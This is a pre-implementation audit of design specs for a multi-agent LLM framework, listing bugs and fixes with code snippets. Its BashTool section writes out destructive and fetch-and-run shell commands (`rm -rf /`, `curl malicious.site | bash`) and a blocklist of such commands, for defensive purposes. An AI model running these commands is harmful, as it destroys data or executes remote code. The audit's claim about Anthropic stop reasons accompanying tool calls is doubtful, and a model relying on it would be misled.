# PRE-IMPLEMENTATION STRESS TEST AUDIT

**Date:** April 8, 2026
**Purpose:** Find every implementation landmine BEFORE coding begins.
**Method:** Systematic trace through all 14 specs + architecture, checking: cross-boundary contracts, missing implementations, async/sync boundaries, race conditions, error propagation, LLM integration fragility, testing gaps, and "works in theory but breaks in practice" scenarios.

---

## SEVERITY KEY

- **🔴 CRITICAL** — Will crash or produce wrong results. Must fix before Day 1.
- **🟡 HIGH** — Will block progress within the first week. Fix before hitting that code.
- **🟢 MEDIUM** — Will cause problems in Phase 2+. Document now, fix when building.
- **⚪ LOW** — Quality/polish issue. Track, fix when convenient.

---

## CRITICAL (🔴) — Fix Before Day 1

### C1: No Decomposition Prompt Template

**What:** Architecture §8 says "Goal → Epic → Feature → Task" via LLM. But the actual system prompt and response format that makes the LLM produce a valid `HierarchicalTaskGraph` JSON is NOT WRITTEN ANYWHERE. Not in the architecture, not in any gap spec.

**Why it's critical:** Decomposition is the FIRST LLM call in every solve(). If it fails or produces malformed output, zero tasks execute. The entire system depends on this one prompt working correctly.

**What's needed:**
1. System prompt explaining the hierarchical structure (EPIC → FEATURE → TASK)
2. JSON Schema the LLM must follow (matching TaskNode fields)
3. Few-shot examples (simple goal → flat tasks; complex goal → hierarchical)
4. Output parsing with validation and retry on malformed JSON
5. Fallback: if hierarchical decomposition fails, try flat decomposition

**Fix:** Write a `DECOMPOSER_PROMPT.md` spec with the full prompt, schema, examples, and parsing logic. This is easily a standalone spec of 200-300 lines.

---

### C2: No Tool Input Schemas (JSON Schema for LLM Function Calling)

**What:** Each tool needs a JSON Schema defining its input parameters so the LLM can call it correctly. Architecture §7.1 shows `input_schema: dict` but never fills it in. The 17 tools (6 core + 6 pheromone + 5 workspace) have no schemas.

**Why it's critical:** Without correct input schemas, the LLM will hallucinate parameter names, types, and structures. A FileRead tool needs `{"path": "string"}`. A FileEdit needs `{"path": "string", "old_string": "string", "new_string": "string", "expected_hash": "string|null"}`. The LLM ONLY knows what parameters exist from the schema.

**What's needed:** For each of 17 tools:
- Complete JSON Schema (OpenAI function-calling format)
- Parameter descriptions that the LLM reads
- Required vs optional parameters
- Validation logic in execute()

**Fix:** Write tool schemas as part of each tool's class definition. This is implementation work but MUST be designed upfront because wrong schemas produce wrong tool calls.

---

### C3: No Agent Role-Specific Prompt Sections

**What:** Architecture §6.5 shows `ROLE_SECTIONS[agent.agent_type]` — a dict mapping agent types to role-specific prompt content. But the actual prompt content for 5 agent types (researcher, architect, developer, reviewer, tester) is NOT WRITTEN.

**Why it's critical:** Agent behavior is 80% determined by their system prompt. A "reviewer" that doesn't know how to review code is just another developer. A "tester" that doesn't know how to write tests is useless.

**What's needed:** 5 role prompts, each 200-500 tokens, explaining:
- What this agent's role is in the colony
- What tools they should prioritize
- What quality standards they should apply
- What pheromone types they should deposit
- What they should NOT do (scope boundaries)

**Fix:** Write a `PROMPT_TEMPLATES.md` with all 5 role prompts + the shared sections (COLONY_RULES, QUALITY, SAFETY, OUTPUT_EFFICIENCY). These can iterate, but v1 must exist before agents execute.

---

### C4: First-Round Allocation Has Zero Capability Pheromones

**What:** The ACO formula uses `τ_cap(a,t)^α` — capability pheromone strength. But on the FIRST allocation round of the FIRST solve(), no capability pheromones exist. Since τ_cap = 0 and α = 2.0, `0^2 = 0`, making `attraction = 0` for all agents. No allocation happens.

**Why it's critical:** The colony would deadlock on the very first solve() call. No agent gets any task.

**Fix:** Deposit initial CAPABILITY pheromones for each agent during Colony.__init__ (or at the start of engine.run()) based on their `AgentConfig.skills`. Each skill gets a CAPABILITY pheromone with `strength = TAU_MAX * 0.5` (moderate confidence — no track record yet).

Add to Colony.solve() or engine.run():
```python
# Before first allocation round:
for agent in self.agents:
    for skill in agent.config.skills:
        await self.environment.deposit(Pheromone(
            type=PheromoneType.CAPABILITY,
            content={"agent_id": agent.id, "skill": skill, "proficiency": 0.5},
            strength=TAU_MAX * 0.5,
            decay_rate=0.01,
            depositor_id="system",
            depositor_trust=1.0,
        ))
```

---

### C5: ColonyOutput Discriminator Requires `mode` Field on Each Model

**What:** The discriminated union uses `Discriminator("mode")`:
```python
ColonyOutput = Annotated[
    Annotated[WorkspaceOutput, Tag("workspace")]
    | Annotated[TextOutput, Tag("text")]
    | Annotated[HybridOutput, Tag("hybrid")],
    Discriminator("mode"),
]
```
Each output model MUST have a `mode` field with a `Literal` type for JSON deserialization to work. If they don't, `ColonyResult.model_validate_json(json_str)` will crash.

**Why it's critical:** ResultStore.save() serializes to JSON. ResultStore.load() deserializes. If the discriminator field is missing, saved results can't be loaded.

**Fix:** Ensure each output model has:
```python
class WorkspaceOutput(BaseModel):
    mode: Literal["workspace"] = "workspace"
    ...

class TextOutput(BaseModel):
    mode: Literal["text"] = "text"
    ...

class HybridOutput(BaseModel):
    mode: Literal["hybrid"] = "hybrid"
    ...
```

Verify this is in the Gap 2 spec. If not, add it.

---

## HIGH (🟡) — Fix Before Hitting That Code

### H1: No Agent-Level Context Compaction Strategy

**What:** Architecture §19 says "at 90% of context budget → compact via 9-section summarization." But this is for the PHEROMONE ENVIRONMENT compaction (§5.5). The AGENT-LEVEL compaction (inside the ReAct loop, when the agent's message history grows too long) is only mentioned in passing in §6.3: `messages = await self.compact_messages(messages)`. The implementation of `compact_messages()` is never specified.

**Impact:** Agents working on complex tasks (many tool calls, large file reads) will exceed their context window. The LLM will return a context_length_exceeded error, crashing the task.

**What's needed:**
- What gets summarized (tool results? assistant messages? everything?)
- How: LLM call with "summarize this conversation so far" or heuristic (drop middle messages)?
- What's preserved: always keep system prompt, always keep last N messages
- Fallback: if compaction doesn't reduce enough, truncate oldest non-system messages

**Fix:** Define `compact_messages()` implementation. Simplest v1: keep system prompt + last 5 messages, summarize everything in between into a single "conversation summary" user message.

---

### H2: No Fallback for Context Compaction Failure

**What:** If after compaction the context is still too large, the next LLM call fails with LLMContextLengthError. There's no second-level fallback.

**Fix:** After compaction, if estimated tokens still exceed budget:
1. Truncate tool results to first 500 chars each
2. Remove all but last 3 messages (keep system + summary + last user)
3. If STILL too large → task fails with "context overflow" and partial output preserved

---

### H3: LiteLLM Cost Extraction Depends on Internal API

**What:** Gap 1 spec extracts cost via `response._hidden_params["response_cost"]`. This is a LiteLLM implementation detail, not a public API. It could change or disappear.

**Fix:** In `_parse_response()`:
```python
# Try LiteLLM's cost tracking first
cost = 0.0
try:
    cost = response._hidden_params.get("response_cost", 0.0)
except (AttributeError, KeyError):
    pass

# Fallback: calculate from MODEL_REGISTRY
if cost == 0.0 and usage.total_tokens > 0:
    caps = MODEL_REGISTRY.get(model)
    if caps:
        cost = (usage.prompt_tokens * caps.cost_per_1k_input / 1000 +
                usage.completion_tokens * caps.cost_per_1k_output / 1000)
```

---

### H4: Embedding Model Loading Blocks Event Loop on First Call

**What:** The embedding spec says lazy loading — model loads on first `embed()` call. `SentenceTransformerEmbedder._load_model()` is synchronous and takes 3-5 seconds. If the first embed() is called inside an async deposit(), the event loop blocks for 3-5 seconds. No other agents can do anything during this time.

**Why it matters:** The first deposit() in a solve() run embeds the GOAL pheromone. All agents wait 3-5s while the embedding model loads.

**Fix:** The spec already uses `asyncio.to_thread()` for individual embed calls. Ensure the lazy model loading ALSO happens inside `to_thread()`:
```python
async def embed(self, text: str) -> list[float]:
    if self._model is None:
        self._model = await asyncio.to_thread(self._load_model_sync)
    return await asyncio.to_thread(self._model.encode, text)
```

---

### H5: ColonyResult Shape When Decomposition Fails

**What:** If decomposition fails (LLM error, malformed output, budget exhausted), what does `colony.solve()` return? Gap 2's OutputAssembler says "handle task_graph=None" but doesn't specify the result.

**Fix:** Define explicitly:
```python
# In OutputAssembler:
if task_graph is None:
    return ColonyResult(
        colony_id=colony_id,
        run_id=run_id,
        completion_status="FAILED",
        output=TextOutput(mode="text", sections=[]),
        task_summaries=[],
        cost_summary=CostSummary(total_cost_usd=tracker.total_cost(), ...),
        warnings=["Decomposition failed: " + str(error)],
        partial_outputs=[],
        started_at=started_at,
        completed_at=datetime.utcnow(),
    )
```

---

### H6: No Error Handling in Tool execute() Methods

**What:** The tool implementations (FileRead, FileWrite, etc.) need to handle OS-level errors: FileNotFoundError, PermissionError, IsADirectoryError, UnicodeDecodeError (for binary files), OSError (disk full), subprocess.TimeoutExpired (for Bash). These must all be caught and returned as `ToolResult(is_error=True, content="...")`, never as unhandled exceptions.

**Why it matters:** An unhandled exception in a tool crashes the entire ReAct loop, which crashes the task, which may cascade.

**Fix:** Every tool execute() method wraps its logic in try/except:
```python
async def execute(self, input: dict, workspace, agent_id: str) -> ToolResult:
    try:
        # ... actual logic ...
        return ToolResult(content=result)
    except FileNotFoundError:
        return ToolResult(content=f"File not found: {path}", is_error=True)
    except PermissionError:
        return ToolResult(content=f"Permission denied: {path}", is_error=True)
    except Exception as e:
        return ToolResult(content=f"Tool error: {type(e).__name__}: {e}", is_error=True)
```

---

### H7: ReAct Loop Termination Bug Risk

**What:** The ReAct loop checks `response.is_terminal` to decide whether to stop. `is_terminal` returns True when `not has_tool_calls OR stop_reason in (END_TURN, MAX_TOKENS, STOP_SEQUENCE, ERROR)`.

**Bug risk:** If the LLM returns a response with BOTH text content AND tool calls (which Anthropic models do), the loop should execute the tools, not terminate. The current `is_terminal` logic is:
```python
return not self.has_tool_calls or self.stop_reason in (END_TURN, ...)
```

If `has_tool_calls=True` and `stop_reason=END_TURN`, this evaluates to `not True or True` → `False or True` → `True`. The loop terminates WITHOUT executing the tool calls.

**This is a real bug.** Anthropic often returns `stop_reason="end_turn"` even when there are tool calls (it means "I'm done generating text, now execute these tools").

**Fix:** Change termination logic:
```python
@property
def is_terminal(self) -> bool:
    if self.has_tool_calls:
        return False  # Always execute tools if they exist
    return self.stop_reason in (StopReason.END_TURN, StopReason.MAX_TOKENS,
                                 StopReason.STOP_SEQUENCE, StopReason.ERROR)
```

---

### H8: BashTool Security — Command Injection

**What:** BashTool executes shell commands from the LLM. The LLM could potentially produce dangerous commands (`rm -rf /`, `curl malicious.site | bash`). Architecture §7.2 marks BashTool as `requires_approval=True`, but the approval system isn't built until Phase 2.

**Impact:** In Phase 1, BashTool runs ANY command the LLM produces without user approval.

**Fix for Phase 1:** Two options:
1. **Blocklist**: Reject commands containing `rm -rf`, `curl | bash`, `wget | sh`, `mkfs`, `dd if=`, `chmod 777`, etc.
2. **Safelist**: Only allow `python`, `pip`, `pytest`, `node`, `npm`, `cat`, `ls`, `mkdir`, `echo`, `grep`, `find`
3. **Disable BashTool entirely in Phase 1** and add it in Phase 2 when approval is built

Recommendation: Option 2 (safelist) for Phase 1. Add full approval in Phase 2.

---

### H9: Missing `completion_status` Determination Logic

**What:** ColonyResult needs a `completion_status` field: "COMPLETED", "PARTIAL", or "FAILED". The logic for determining this is described in Gap 2 but subtly incomplete.

When all leaf tasks are COMPLETED → "COMPLETED". When some are COMPLETED and some ABANDONED → "PARTIAL". When all failed → "FAILED". But what about:
- Budget exhausted mid-execution (some tasks never started)?
- User cancelled (some tasks in progress)?
- Timeout (some tasks timed out)?

**Fix:** Explicit determination:
```python
def _determine_completion_status(task_graph, tracker, was_cancelled, budget_exhausted):
    completed = sum(1 for r in tracker.all_records() if r.status == "COMPLETED")
    total = len(task_graph.get_leaf_tasks())
    
    if completed == total:
        return "COMPLETED"
    elif completed == 0:
        return "FAILED"
    else:
        return "PARTIAL"
    # Additional context in warnings: "cancelled by user", "budget exhausted", etc.
```

---

## MEDIUM (🟢) — Document Now, Fix When Building

### M1: Circular Import Risk — models/execution.py → llm/models.py

**What:** `models/execution.py` imports `LLMUsage` from `llm/models.py`. If any `llm/` module ever imports from `models/execution.py`, it creates a circular import. Currently safe, but fragile.

**Mitigation:** Add a comment in both files: `# WARNING: models/execution.py imports from llm/models.py. Do NOT import from models/ in llm/ modules.`

### M2: EmbeddingConfig.provider Defaults to LOCAL but sentence-transformers May Not Be Installed

**What:** If a user does `pip install pheromone` (core only, no extras), the EmbeddingConfig defaults to `provider="local"`. But sentence-transformers isn't installed. The first embed() call will raise MissingDependencyError.

**Fix:** Config validator should check: if `embedding.provider == "local"`, try importing sentence_transformers. If not available, auto-downgrade to "null" with a warning, don't error.

### M3: RetryPolicy._overload_count Is Shared State

**What:** `RetryPolicy` is a dataclass with `_overload_count` as instance state. If the same RetryPolicy instance is shared across concurrent agent tasks, the overload counter is shared. This could cause one agent's overload retries to count against another agent's limit.

**Fix:** Call `policy.reset()` at the start of each `retry_with_policy()` call (already done in the spec). But if two concurrent calls share the same policy instance, reset() in one clears the count for the other. Solution: create a new RetryPolicy per call, or use per-call state.

### M4: Git Operations Are Synchronous

**What:** gitpython operations (commit, tag) are synchronous file I/O. In an async context, they block the event loop. For small repos (<1000 files), this is <100ms and acceptable. For larger repos, it could become a problem.

**Fix for Phase 2:** Wrap git operations in `asyncio.to_thread()`.

### M5: No Graceful Handling of LLM Returning Empty Response

**What:** Some LLMs (especially Ollama local models) occasionally return empty content with no tool calls. The ReAct loop's termination check would see `has_tool_calls=False` and `stop_reason=END_TURN` → terminal. It would call `extract_output(response, task)` with `response.text = ""`.

**Fix:** In ReAct loop, after checking termination:
```python
if response.is_terminal:
    output = self.extract_output(response, task)
    if output.text_content is None or output.text_content.strip() == "":
        # Empty response — LLM didn't produce anything useful
        if turn == 0:
            # First turn empty — try re-prompting once
            messages.append(LLMMessage.user("Please provide your response."))
            continue
        # Later turn empty — accept what we have
    return output
```

### M6: No Rate Limiting on Pheromone Deposits

**What:** Architecture §20 says "rate limits (50 deposits/agent/min)". But no spec implements this counter.

**Fix:** Add to PheromoneEnvironment:
```python
self._deposit_counts: dict[str, list[float]] = {}  # agent_id → [timestamps]

async def deposit(self, pheromone):
    # Rate limit check
    now = time.monotonic()
    agent_deposits = self._deposit_counts.setdefault(pheromone.depositor_id, [])
    # Remove entries older than 60s
    agent_deposits = [t for t in agent_deposits if now - t < 60]
    if len(agent_deposits) >= 50:
        raise PheromoneError("Rate limit exceeded: 50 deposits/minute")
    agent_deposits.append(now)
    self._deposit_counts[pheromone.depositor_id] = agent_deposits
    # ... continue with deposit
```

### M7: No Validation of Task Dependencies Referencing Real Task IDs

**What:** When the decomposer creates a TaskGraph, tasks have `dependencies: list[str]` which should reference other task IDs. If the LLM produces a dependency ID that doesn't exist, the graph is invalid. `validate_dag()` only checks for cycles (via Kahn's), not for dangling references.

**Fix:** Add to `HierarchicalTaskGraph.validate_dag()`:
```python
all_ids = set(self.nodes.keys())
for node in self.nodes.values():
    for dep_id in node.dependencies:
        if dep_id not in all_ids:
            raise DecompositionError(f"Task {node.id} depends on non-existent task {dep_id}")
```

### M8: WebSocket Connection Handling in GUI (Phase 4)

**What:** The GUI spec (Gap 6b) describes a WebSocket bridge. But what happens when the WebSocket disconnects mid-solve? The colony keeps running but events are lost. When the client reconnects, it needs to catch up.

**Fix:** Already noted in Gap 6b as "reconnect resync via status command." Ensure the EventEmitter's persist_buffer enables replay of missed events on reconnect.

### M9: No Maximum File Size for FileWrite

**What:** If the LLM generates a FileWrite with 100MB of content, the workspace will accept it. No size limit.

**Fix:** Add to WorkspaceManager.write_file():
```python
MAX_FILE_WRITE_SIZE = 10 * 1024 * 1024  # 10MB
if len(content) > MAX_FILE_WRITE_SIZE:
    raise WorkspaceError(f"File too large: {len(content)} bytes (max {MAX_FILE_WRITE_SIZE})")
```

### M10: TaskOutput Missing from Gap 2 Spec Body

**What:** The cross-spec audit DEFINES TaskOutput (the return type of AgentReActLoop.execute()). But this model was added during the audit, not in Gap 2 itself. Claude Code might miss it if it reads Gap 2 but not the cross-spec audit.

**Fix:** The CLAUDE.md cross-spec contracts table already maps TaskOutput to models/execution.py. Also add a note in Gap 2 referencing the cross-spec audit for TaskOutput.

---

## LOW (⚪) — Track for Later

### L1: `datetime.utcnow()` is deprecated in Python 3.12+
Use `datetime.now(timezone.utc)` instead. Multiple specs use `datetime.utcnow()`.

### L2: No `__repr__` on key classes
AgentProxy, ExecutionEngine, Colony would benefit from custom __repr__ for debugging.

### L3: No logging in InMemoryStore operations
Add debug-level logging for deposit/sense/decay to aid debugging.

### L4: PheromoneScope.TEAM requires team_id matching but no team_id on SenseResult query
The sense() signature doesn't include a team_id parameter for filtering.

### L5: ToolDefinitionSchema.parameters is `dict[str, Any]` — unvalidated
The JSON Schema could be malformed. No validation that it's actually a valid JSON Schema.

---

## IMPLEMENTATION ORDER IMPACT

These findings change the implementation roadmap:

| Finding | Impact on Roadmap |
|---------|-------------------|
| C1 (Decomposition prompt) | Add as Day 4 pre-work. Write prompts BEFORE building decomposer. |
| C2 (Tool schemas) | Add as Day 4 pre-work. Define schemas alongside tool implementations. |
| C3 (Role prompts) | Add as Day 4 work. Write alongside prompt_builder.py. |
| C4 (Initial capabilities) | Add to Day 5 Colony.solve() implementation. 10 lines of code. |
| C5 (Discriminator fields) | Add to Day 1 results.py implementation. 3 lines of code. |
| H7 (ReAct termination bug) | Fix in Day 4 react_loop.py. Change 2 lines. |
| H8 (BashTool safety) | Day 4 — implement safelist in BashTool. |

---

## DOCUMENTS TO PRODUCE BEFORE DAY 1

Based on this audit, three additional micro-specs are needed:

### 1. `DECOMPOSER_PROMPTS.md` (~200 lines)
- System prompt for hierarchical decomposition
- JSON schema the LLM must output (matching TaskNode/TaskGraph)
- 2-3 few-shot examples (simple → flat tasks, complex → hierarchical)
- Parsing + validation + retry logic
- Fallback strategy for malformed output

### 2. `AGENT_ROLE_PROMPTS.md` (~300 lines)
- 5 role-specific prompts (researcher, architect, developer, reviewer, tester)
- Shared sections (colony rules, quality, safety, output efficiency)
- Tool usage guidance per role
- Pheromone deposit guidance per role

### 3. `TOOL_SCHEMAS.md` (~200 lines)
- JSON Schema for all 17 tools
- Input/output descriptions
- Required vs optional parameters
- Example invocations

**Total additional spec work: ~700 lines, ~2-3 hours.**

---

## STRESS TEST SCENARIOS

For each scenario, I've verified whether existing specs handle it:

| Scenario | Handled? | Where | Gap? |
|----------|----------|-------|------|
| LLM returns malformed JSON for tool call | ✅ | Gap 1 retry logic + error back to LLM | None |
| Agent exceeds context window | 🟡 | §19 mentions compaction | H1: compact_messages() undefined |
| Two agents edit same file | ✅ | §9.3 file leasing | None |
| Budget exhausted mid-task | ✅ | Gap 10 §3 graceful stop | None |
| LLM API goes down during execution | ✅ | Gap 1 retry + fallback chain | None |
| Agent crashes mid-task | ✅ | Gap 10 §5 agent crash isolation | None |
| Decomposition produces cyclic graph | ✅ | §4.3 Kahn's validation | None |
| All agents fail on same task | ✅ | Task retries 3× then ABANDONED | H9: completion_status logic |
| User presses Ctrl+C | ✅ | Gap 10 §6 (1st → graceful, 2nd → force) | None |
| Colony.solve() called twice | ✅ | Gap 10 §7 re-entrant solve | None |
| Redis connection drops mid-solve | ✅ | Gap 3 §5 fallback_to_memory | None |
| LLM returns empty response | 🟡 | Not explicitly handled | M5: empty response handling |
| Workspace directory deleted during execution | ❌ | Not handled | M9-adjacent: add exist check |
| File has non-UTF-8 encoding | 🟡 | Not explicitly handled | H6: UnicodeDecodeError catch |
| Tool execution hangs forever | ✅ | §6.4 asyncio.wait_for(timeout) | None |
| Pheromone store has 10K+ pheromones | ✅ | §5.5 compaction at 50/type | None |
| First solve with no capability pheromones | ❌ | Not handled | C4: CRITICAL |
| LLM produces tool call for non-existent tool | ✅ | ToolOrchestrator returns error | None |
| Multiple colonies share same workspace | ❌ | Not handled | OUT OF SCOPE for v1 |
| Network partition during Redis operations | ✅ | fallback_to_memory | None |

---

## CHECKLIST: WHAT MUST EXIST BEFORE `/ultraplan`

- [  ] Architecture v2.1 (exists ✅)
- [  ] 13 gap specs (exist ✅)
- [  ] Cross-spec audit (exists ✅)
- [  ] System design + tech stack (exists ✅)
- [  ] Implementation roadmap (exists ✅)
- [  ] CLAUDE.md (exists ✅)
- [  ] **DECOMPOSER_PROMPTS.md** (⬜ NEEDED — C1)
- [  ] **AGENT_ROLE_PROMPTS.md** (⬜ NEEDED — C3)
- [  ] **TOOL_SCHEMAS.md** (⬜ NEEDED — C2)
- [  ] **This audit document** with all fixes applied (⬜ mark fixes in existing specs)

---

*This audit found 5 CRITICAL, 9 HIGH, 10 MEDIUM, and 5 LOW issues. The 5 CRITICAL issues would have caused either a deadlock (C4), runtime crash (C5, H7), or non-functional output (C1, C2, C3) within the first week of implementation. Every issue has a documented fix. Three additional micro-specs are needed before Day 1.*
